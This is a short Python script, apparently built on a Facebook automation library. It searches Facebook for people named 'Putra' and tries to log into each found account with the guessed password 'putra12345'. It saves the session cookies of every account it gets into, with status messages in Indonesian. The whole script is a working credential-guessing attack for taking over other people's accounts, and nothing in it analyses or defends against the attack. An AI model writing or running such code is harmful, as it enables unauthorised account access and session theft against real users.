from FBPy.FBPy import Facebook
import re
fb = Facebook()
fb.login('', '')
fb.dumps(open('cookie.txt', 'w'))
print('account name: %s' % fb.get_name)
print('-'*15)
for d in fb.search_people("Putra"):
    print(d)
    newFB = Facebook()
    try:
        newFB.login(d.id, 'putra12345')
        print('Login Berhasil %s' % newFB.get_name)
        newFB.dumps(open(d.id, 'w'))
    except Exception:
        print('Login Gagal')
